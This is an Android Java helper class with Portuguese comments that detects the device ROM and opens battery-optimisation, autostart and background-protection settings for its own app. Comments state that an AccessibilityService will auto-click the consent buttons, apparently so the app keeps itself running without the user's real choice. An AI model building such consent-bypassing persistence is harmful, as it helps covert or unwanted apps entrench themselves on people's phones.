package com.seguranca.protecao;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

/**
 * 🔧 ROM COMPATIBILITY - Compatibilidade com todas as ROMs
 * 
 * Detecta automaticamente a ROM (MIUI, ColorOS, EMUI, One UI, etc)
 * e abre as configurações específicas para:
 * - Desativar otimização de bateria
 * - Habilitar Autostart
 * - Desativar kill de apps em background
 * 
 * O AccessibilityService vai auto-clicar nas opções!
 */
public class ROMCompatibility {
    
    private static final String TAG = "ROMCompat";
    private Context context;
    
    // Tipos de ROM detectados
    public enum ROMType {
        MIUI,       // Xiaomi
        EMUI,       // Huawei
        COLOROS,    // Oppo/Realme
        ONEUI,      // Samsung
        FLYME,      // Meizu
        FUNTOUCH,   // Vivo
        STOCK,      // Android puro (Pixel, etc)
        UNKNOWN
    }
    
    public ROMCompatibility(Context context) {
        this.context = context;
    }
    
    /**
     * 🔍 Detecta qual ROM está sendo usada
     */
    public ROMType detectROM() {
        String manufacturer = Build.MANUFACTURER.toLowerCase();
        String brand = Build.BRAND.toLowerCase();
        
        // Xiaomi / MIUI
        if (manufacturer.contains("xiaomi") || brand.contains("xiaomi") || 
            brand.contains("redmi") || brand.contains("poco")) {
            Log.d(TAG, "📱 ROM detectada: MIUI (Xiaomi)");
            return ROMType.MIUI;
        }
        
        // Huawei / EMUI
        if (manufacturer.contains("huawei") || brand.contains("huawei") ||
            brand.contains("honor")) {
            Log.d(TAG, "📱 ROM detectada: EMUI (Huawei)");
            return ROMType.EMUI;
        }
        
        // Oppo / Realme / ColorOS
        if (manufacturer.contains("oppo") || brand.contains("oppo") ||
            manufacturer.contains("realme") || brand.contains("realme")) {
            Log.d(TAG, "📱 ROM detectada: ColorOS (Oppo/Realme)");
            return ROMType.COLOROS;
        }
        
        // Samsung / One UI
        if (manufacturer.contains("samsung") || brand.contains("samsung")) {
            Log.d(TAG, "📱 ROM detectada: One UI (Samsung)");
            return ROMType.ONEUI;
        }
        
        // Vivo / Funtouch
        if (manufacturer.contains("vivo") || brand.contains("vivo")) {
            Log.d(TAG, "📱 ROM detectada: Funtouch (Vivo)");
            return ROMType.FUNTOUCH;
        }
        
        // Meizu / Flyme
        if (manufacturer.contains("meizu") || brand.contains("meizu")) {
            Log.d(TAG, "📱 ROM detectada: Flyme (Meizu)");
            return ROMType.FLYME;
        }
        
        // Google / Stock
        if (manufacturer.contains("google") || brand.contains("google")) {
            Log.d(TAG, "📱 ROM detectada: Stock Android (Google)");
            return ROMType.STOCK;
        }
        
        Log.d(TAG, "📱 ROM desconhecida: " + manufacturer + "/" + brand);
        return ROMType.UNKNOWN;
    }
    
    /**
     * 🔋 Verifica se a otimização de bateria está desativada para o app
     */
    public boolean isIgnoringBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        return true; // Versões antigas não têm essa restrição
    }
    
    /**
     * 🔋 Abre configurações para desativar otimização de bateria (método padrão)
     * Este método abre o dialog direto de "Ignorar otimização de bateria"
     */
    public void requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                // Método 1: Dialog direto (melhor - não precisa de auto-click)
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "🔋 Solicitando desativar otimização de bateria (dialog direto)");
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao solicitar: " + e.getMessage());
                // Fallback: abre configurações do app diretamente
                openAppBatterySettings();
            }
        }
    }
    
    /**
     * 🔋 Abre configurações de bateria DO NOSSO APP diretamente
     */
    public void openAppBatterySettings() {
        try {
            // Abre a tela de configurações de bateria do nosso app
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "🔋 Abrindo configurações do app");
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro: " + e.getMessage());
        }
    }
    
    /**
     * 🔋 Abre configurações de bateria gerais
     */
    public void openBatterySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao abrir config de bateria: " + e.getMessage());
        }
    }
    
    /**
     * 🔋 Abre configurações de bateria DO NOSSO APP (Android 6+)
     * Usa Intent específico que vai DIRETO para a tela do app
     */
    public void openOurAppBatterySettings() {
        try {
            // Android 6+ tem uma tela específica para configurar bateria de um app
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "🔋 Abrindo configurações do nosso app diretamente");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro: " + e.getMessage());
            openBatterySettings();
        }
    }
    
    /**
     * 🚀 Abre configurações de Autostart específicas da ROM
     */
    public boolean openAutoStartSettings() {
        ROMType rom = detectROM();
        
        switch (rom) {
            case MIUI:
                return openMIUIAutoStart();
            case EMUI:
                return openEMUIAutoStart();
            case COLOROS:
                return openColorOSAutoStart();
            case ONEUI:
                return openOneUIAutoStart();
            case FUNTOUCH:
                return openFuntouchAutoStart();
            case FLYME:
                return openFlymeAutoStart();
            default:
                return openGenericAutoStart();
        }
    }
    
    /**
     * 🔧 Abre TODAS as configurações necessárias para a ROM detectada
     * O AccessibilityService vai auto-clicar nos botões necessários
     */
    public void openAllROMSettings() {
        ROMType rom = detectROM();
        Log.d(TAG, "🔧 Iniciando configuração para ROM: " + rom.name());
        
        // 1. PRIMEIRO: Se não está ignorando bateria, abre o DIALOG DIRETO
        // Este dialog mostra "Permitir" e o AccessibilityService clica
        if (!isIgnoringBatteryOptimizations()) {
            Log.d(TAG, "🔋 Bateria NÃO está ignorada, abrindo dialog...");
            requestIgnoreBatteryOptimization();
            
            // Após 3 segundos, abre Autostart
            new android.os.Handler().postDelayed(() -> {
                Log.d(TAG, "🚀 Abrindo configurações de Autostart...");
                openAutoStartSettings();
            }, 3000);
        } else {
            // Se já está ignorando bateria, só abre Autostart
            Log.d(TAG, "🔋 Bateria já está ignorada! Abrindo Autostart...");
            openAutoStartSettings();
        }
        
        // 2. Abre proteção de apps específica da ROM (após delay maior)
        new android.os.Handler().postDelayed(() -> {
            Log.d(TAG, "🛡️ Abrindo configurações de proteção...");
            openAppProtectionSettings(rom);
        }, 6000);
    }
    
    // ==================== XIAOMI / MIUI ====================
    
    private boolean openMIUIAutoStart() {
        Intent[] intents = {
            // AutoStart Manager
            new Intent().setComponent(new ComponentName("com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            // Permissions
            new Intent().setComponent(new ComponentName("com.miui.securitycenter",
                "com.miui.permcenter.permissions.PermissionsEditorActivity")),
            // Security Center
            new Intent().setComponent(new ComponentName("com.miui.securitycenter",
                "com.miui.securitycenter.MainActivity"))
        };
        
        return tryIntents(intents, "MIUI AutoStart");
    }
    
    // ==================== HUAWEI / EMUI ====================
    
    private boolean openEMUIAutoStart() {
        Intent[] intents = {
            // Startup Manager
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager",
                "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            // Power Manager
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager",
                "com.huawei.systemmanager.power.ui.HwPowerManagerActivity")),
            // App Launch
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager",
                "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"))
        };
        
        return tryIntents(intents, "EMUI AutoStart");
    }
    
    // ==================== OPPO / REALME / COLOROS ====================
    
    private boolean openColorOSAutoStart() {
        Intent[] intents = {
            // ColorOS 7+
            new Intent().setComponent(new ComponentName("com.coloros.safecenter",
                "com.coloros.safecenter.startupapp.StartupAppListActivity")),
            // ColorOS 5/6
            new Intent().setComponent(new ComponentName("com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            // Oppo
            new Intent().setComponent(new ComponentName("com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity")),
            // Realme
            new Intent().setComponent(new ComponentName("com.coloros.safecenter",
                "com.coloros.privacypermissionsentry.PermissionTopActivity"))
        };
        
        return tryIntents(intents, "ColorOS AutoStart");
    }
    
    // ==================== SAMSUNG / ONE UI ====================
    
    private boolean openOneUIAutoStart() {
        Intent[] intents = {
            // Device Care
            new Intent().setComponent(new ComponentName("com.samsung.android.lool",
                "com.samsung.android.sm.battery.ui.BatteryActivity")),
            // Smart Manager
            new Intent().setComponent(new ComponentName("com.samsung.android.sm",
                "com.samsung.android.sm.ui.battery.BatteryActivity")),
            // Settings
            new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                .setData(Uri.parse("package:" + context.getPackageName()))
        };
        
        return tryIntents(intents, "One UI Settings");
    }
    
    // ==================== VIVO / FUNTOUCH ====================
    
    private boolean openFuntouchAutoStart() {
        Intent[] intents = {
            // i Manager
            new Intent().setComponent(new ComponentName("com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            // Older Vivo
            new Intent().setComponent(new ComponentName("com.iqoo.secure",
                "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"))
        };
        
        return tryIntents(intents, "Funtouch AutoStart");
    }
    
    // ==================== MEIZU / FLYME ====================
    
    private boolean openFlymeAutoStart() {
        Intent[] intents = {
            new Intent().setComponent(new ComponentName("com.meizu.safe",
                "com.meizu.safe.permission.SmartBGActivity"))
        };
        
        return tryIntents(intents, "Flyme AutoStart");
    }
    
    // ==================== GENÉRICO ====================
    
    private boolean openGenericAutoStart() {
        try {
            // Abre configurações do app diretamente
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "📱 Abrindo configurações genéricas do app");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * 🛡️ Abre configurações de proteção de apps (kill em background)
     */
    private void openAppProtectionSettings(ROMType rom) {
        try {
            switch (rom) {
                case MIUI:
                    // Battery Saver
                    Intent miuiBattery = new Intent();
                    miuiBattery.setComponent(new ComponentName("com.miui.powerkeeper",
                        "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
                    miuiBattery.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(miuiBattery);
                    break;
                    
                case EMUI:
                    // Protected Apps
                    Intent huaweiProtect = new Intent();
                    huaweiProtect.setComponent(new ComponentName("com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                    huaweiProtect.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(huaweiProtect);
                    break;
                    
                case COLOROS:
                    // Battery optimization
                    Intent oppoOptim = new Intent();
                    oppoOptim.setComponent(new ComponentName("com.coloros.oppoguardelf",
                        "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"));
                    oppoOptim.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(oppoOptim);
                    break;
                    
                default:
                    // Genérico - abre bateria
                    openBatterySettings();
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Config de proteção não disponível: " + e.getMessage());
        }
    }
    
    /**
     * 🔧 Tenta abrir uma lista de intents até um funcionar
     */
    private boolean tryIntents(Intent[] intents, String name) {
        for (Intent intent : intents) {
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                if (isIntentAvailable(intent)) {
                    context.startActivity(intent);
                    Log.d(TAG, "✅ Aberto: " + name);
                    return true;
                }
            } catch (Exception e) {
                Log.d(TAG, "⚠️ Intent não disponível: " + e.getMessage());
            }
        }
        
        Log.w(TAG, "❌ Nenhum intent disponível para: " + name);
        return openGenericAutoStart();
    }
    
    /**
     * 🔍 Verifica se um intent está disponível no sistema
     */
    private boolean isIntentAvailable(Intent intent) {
        PackageManager pm = context.getPackageManager();
        return intent.resolveActivity(pm) != null;
    }
    
    /**
     * 📋 Retorna informações da ROM para debug
     */
    public String getROMInfo() {
        return String.format(
            "Manufacturer: %s\nBrand: %s\nModel: %s\nROM: %s\nAndroid: %s (API %d)",
            Build.MANUFACTURER,
            Build.BRAND,
            Build.MODEL,
            detectROM().name(),
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
    }
}

